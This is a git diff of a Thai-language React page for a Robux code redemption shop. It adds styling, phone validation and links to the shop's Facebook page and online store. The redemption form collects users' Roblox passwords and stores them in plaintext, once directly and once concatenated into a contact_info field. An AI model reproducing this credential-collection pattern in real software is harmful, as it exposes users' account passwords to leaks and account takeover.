@@ -173,6 +173,13 @@ export default function Home() {
       return;
     }
 
+    // Validate phone number format (basic validation)
+    const phoneRegex = /^0[0-9]{8,9}$/;
+    if (!phoneRegex.test(redeemForm.contact.replace(/\s|-/g, ''))) {
+      toast.error("กรุณากรอกเบอร์โทรศัพท์ให้ถูกต้อง (เช่น 0812345678)");
+      return;
+    }
+
     setIsRobuxButtonSubmitting(true);
     const toastId = toast.loading('กำลังดำเนินการแลกโค้ด...');
 
@@ -198,7 +205,7 @@ export default function Home() {
         code_id: validatedCode!.id,
         roblox_username: redeemForm.username,
         roblox_password: redeemForm.password,
-        contact_info: `Code: ${validatedCode!.code} | Password: ${redeemForm.password} | Contact: ${redeemForm.contact}`,
+        contact_info: `Code: ${validatedCode!.code} | Password: ${redeemForm.password} | Phone: ${redeemForm.contact}`,
         robux_amount: validatedCode!.robux_value || validatedCode!.robux_amount || 0,
         status: 'pending',
         created_at: new Date().toISOString()
@@ -439,6 +446,21 @@ export default function Home() {
                 👑 แอดมิน
               </Button>
             </Link>
+            <Button 
+              onClick={() => window.open('https://www.facebook.com/LemonShopStore/', '_blank')}
+              className="bg-gradient-to-r from-blue-600 to-blue-700 backdrop-blur-xl border border-blue-500/30 text-white hover:from-blue-700 hover:to-blue-800 transition-all shadow-lg"
+            >
+              <svg className="w-4 h-4 mr-2" fill="currentColor" viewBox="0 0 24 24">
+                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+              </svg>
+              📞 ติดต่อร้าน
+            </Button>
+            <Button 
+              onClick={() => window.open('https://lemonshop.rdcw.xyz/', '_blank')}
+              className="bg-gradient-to-r from-orange-600 to-yellow-600 backdrop-blur-xl border border-orange-500/30 text-white hover:from-orange-700 hover:to-yellow-700 transition-all shadow-lg"
+            >
+              🛒 ร้านค้าออนไลน์
+            </Button>
           </div>
         </div>
 
@@ -845,56 +867,163 @@ export default function Home() {
 
         {/* Robux Redemption Dialog */}
         <Dialog open={showRedeemPopup} onOpenChange={setShowRedeemPopup}>
-          <DialogContent className="sm:max-w-md bg-white/95 backdrop-blur-xl border border-white/20">
-            <DialogHeader>
-              <DialogTitle className="text-green-600 text-xl">🎫 แลกโค้ดรับ Robux</DialogTitle>
-              <DialogDescription className="text-gray-600">
-                กรอกข้อมูล Roblox ของคุณเพื่อรับ {validatedCode?.robux_value || validatedCode?.robux_amount} Robux
+          <DialogContent className="sm:max-w-lg bg-gradient-to-br from-white/95 to-white/90 backdrop-blur-xl border border-white/30 shadow-2xl">
+            <DialogHeader className="text-center pb-6">
+              <div className="relative mb-4">
+                {/* Glowing Background */}
+                <div className="absolute inset-0 bg-gradient-to-r from-green-400/30 to-emerald-400/30 rounded-full blur-2xl"></div>
+                <div className="relative bg-gradient-to-r from-green-500 to-emerald-500 rounded-full w-16 h-16 mx-auto flex items-center justify-center shadow-lg border-2 border-white/20">
+                  <span className="text-2xl">💎</span>
+                </div>
+              </div>
+              
+              <DialogTitle className="text-2xl font-bold bg-gradient-to-r from-green-600 to-emerald-600 bg-clip-text text-transparent">
+                แลกโค้ดรับ Robux
+              </DialogTitle>
+              <DialogDescription className="text-gray-600 text-base mt-2">
+                กรอกข้อมูล Roblox ของคุณเพื่อรับ <span className="font-bold text-green-600">{validatedCode?.robux_value || validatedCode?.robux_amount} Robux</span>
               </DialogDescription>
             </DialogHeader>
             
-            <form onSubmit={handleRobuxSubmit} className="space-y-4">
-              <div>
-                <Label htmlFor="username">ชื่อผู้ใช้ Roblox</Label>
-                <Input
-                  id="username"
-                  value={redeemForm.username}
-                  onChange={(e) => setRedeemForm(prev => ({ ...prev, username: e.target.value }))}
-                  placeholder="ชื่อผู้ใช้ของคุณใน Roblox"
-                />
-              </div>
-              <div>
-                <Label htmlFor="password">รหัสผ่าน Roblox</Label>
-                <Input
-                  id="password"
-                  type="password"
-                  value={redeemForm.password}
-                  onChange={(e) => setRedeemForm(prev => ({ ...prev, password: e.target.value }))}
-                  placeholder="รหัสผ่านของคุณ"
-                />
-              </div>
-              <div>
-                <Label htmlFor="contact">ข้อมูลติดต่อ</Label>
-                <Input
-                  id="contact"
-                  value={redeemForm.contact}
-                  onChange={(e) => setRedeemForm(prev => ({ ...prev, contact: e.target.value }))}
-                  placeholder="Discord, LINE ID หรือ Facebook"
-                />
+            <form onSubmit={handleRobuxSubmit} className="space-y-6">
+              <div className="space-y-4">
+                <div>
+                  <Label htmlFor="username" className="text-gray-700 font-semibold flex items-center gap-2 mb-2">
+                    <span className="text-green-600">👤</span>
+                    ชื่อผู้ใช้ Roblox
+                  </Label>
+                  <Input
+                    id="username"
+                    value={redeemForm.username}
+                    onChange={(e) => setRedeemForm(prev => ({ ...prev, username: e.target.value }))}
+                    placeholder="ชื่อผู้ใช้ของคุณใน Roblox"
+                    className="h-12 border-2 border-gray-200 focus:border-green-400 focus:ring-2 focus:ring-green-400/20 transition-all"
+                  />
+                </div>
+                
+                <div>
+                  <Label htmlFor="password" className="text-gray-700 font-semibold flex items-center gap-2 mb-2">
+                    <span className="text-green-600">🔒</span>
+                    รหัสผ่าน Roblox
+                  </Label>
+                  <Input
+                    id="password"
+                    type="password"
+                    value={redeemForm.password}
+                    onChange={(e) => setRedeemForm(prev => ({ ...prev, password: e.target.value }))}
+                    placeholder="รหัสผ่านของคุณ"
+                    className="h-12 border-2 border-gray-200 focus:border-green-400 focus:ring-2 focus:ring-green-400/20 transition-all"
+                  />
+                </div>
+                
+                <div>
+                  <Label htmlFor="contact" className="text-gray-700 font-semibold flex items-center gap-2 mb-2">
+                    <span className="text-green-600">📱</span>
+                    เบอร์โทรศัพท์
+                  </Label>
+                  <Input
+                    id="contact"
+                    value={redeemForm.contact}
+                    onChange={(e) => setRedeemForm(prev => ({ ...prev, contact: e.target.value }))}
+                    placeholder="กรอกเบอร์โทรศัพท์ (เช่น 08X-XXX-XXXX)"
+                    className="h-12 border-2 border-gray-200 focus:border-green-400 focus:ring-2 focus:ring-green-400/20 transition-all"
+                  />
+                </div>
               </div>
               
-              <DialogFooter className="mt-4">
+              {/* Info Box */}
+              <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-xl p-4">
+                <div className="flex items-start gap-3">
+                  <div className="text-green-600 text-lg">💡</div>
+                  <div>
+                    <h4 className="text-green-800 font-semibold mb-1">ข้อมูลสำคัญ</h4>
+                    <p className="text-green-700 text-sm">
+                      กรุณากรอกข้อมูลให้ถูกต้อง ระบบจะส่ง Robux ไปยังบัญชี Roblox ของคุณภายใน 24 ชั่วโมง
+                    </p>
+                  </div>
+                </div>
+              </div>
+              
+              <DialogFooter className="pt-4">
                 <Button 
                   type="submit"
                   disabled={isRobuxButtonSubmitting}
-                  className="w-full bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700"
+                  className="w-full h-14 text-lg font-semibold bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 shadow-lg transition-all transform hover:scale-105"
                 >
-                  {isRobuxButtonSubmitting ? 'กำลังแลก...' : '🎫 แลกโค้ด'}
+                  {isRobuxButtonSubmitting ? (
+                    <div className="flex items-center gap-3">
+                      <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
+                      <span>กำลังแลก...</span>
+                    </div>
+                  ) : (
+                    <div className="flex items-center gap-3">
+                      <span className="text-xl">💎</span>
+                      <span>แลกโค้ด</span>
+                    </div>
+                  )}
                 </Button>
               </DialogFooter>
             </form>
           </DialogContent>
         </Dialog>
+
+        {/* Additional Products Section */}
+        <div className="mt-16 text-center">
+          <div className="bg-white/5 backdrop-blur-xl rounded-2xl p-8 border border-white/10">
+            <h3 className="text-2xl font-bold text-white mb-4">🛒 สินค้าเพิ่มเติม</h3>
+            <p className="text-purple-200 mb-6">เยี่ยมชมร้านค้าออนไลน์ของเราเพื่อดูสินค้าอื่นๆ เพิ่มเติม ไก่ตัน Robux โค้ด Rainbow Six</p>
+            
+            <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
+              <div className="bg-white/10 rounded-lg p-4 border border-white/20">
+                <div className="text-3xl mb-2">🐔</div>
+                <h4 className="text-white font-semibold mb-2">ไก่ตัน</h4>
+                <p className="text-purple-200 text-sm">บัญชีเกมไก่ตัน</p>
+              </div>
+              <div className="bg-white/10 rounded-lg p-4 border border-white/20">
+                <div className="text-3xl mb-2">💎</div>
+                <h4 className="text-white font-semibold mb-2">Robux</h4>
+                <p className="text-purple-200 text-sm">โค้ดแลก Robux</p>
+              </div>
+              <div className="bg-white/10 rounded-lg p-4 border border-white/20">
+                <div className="text-3xl mb-2">🌈</div>
+                <h4 className="text-white font-semibold mb-2">Rainbow Six</h4>
+                <p className="text-purple-200 text-sm">โค้ดเกม Rainbow Six</p>
+              </div>
+            </div>
+            
+            <Button 
+              onClick={() => window.open('https://lemonshop.rdcw.xyz/', '_blank')}
+              className="bg-gradient-to-r from-orange-600 to-yellow-600 hover:from-orange-700 hover:to-yellow-700 text-white px-8 py-3 rounded-xl shadow-lg transition-all transform hover:scale-105 mb-8"
+            >
+              🛒 ไปยังร้านค้าออนไลน์
+            </Button>
+          </div>
+        </div>
+
+        {/* Contact Section */}
+        <div className="mt-8 text-center">
+          <div className="bg-white/5 backdrop-blur-xl rounded-2xl p-8 border border-white/10">
+            <h3 className="text-2xl font-bold text-white mb-4">📞 ต้องการความช่วยเหลือ?</h3>
+            <p className="text-purple-200 mb-6">ติดต่อเราได้ผ่าน Facebook เพื่อรับบริการและคำแนะนำ</p>
+            
+            <div className="flex flex-col sm:flex-row gap-4 justify-center items-center">
+              <Button 
+                onClick={() => window.open('https://www.facebook.com/LemonShopStore/', '_blank')}
+                className="bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white px-8 py-3 rounded-xl shadow-lg transition-all transform hover:scale-105"
+              >
+                <svg className="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 24 24">
+                  <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                </svg>
+                📱 ติดต่อ Lemon Shop
+              </Button>
+              
+              <div className="text-purple-200 text-sm">
+                <p>⏰ เปิดบริการ: 24 ชั่วโมง</p>
+                <p>💬 ตอบกลับภายใน 5-10 นาที</p>
+              </div>
+            </div>
+          </div>
+        </div>
       </div>
     </div>
   );
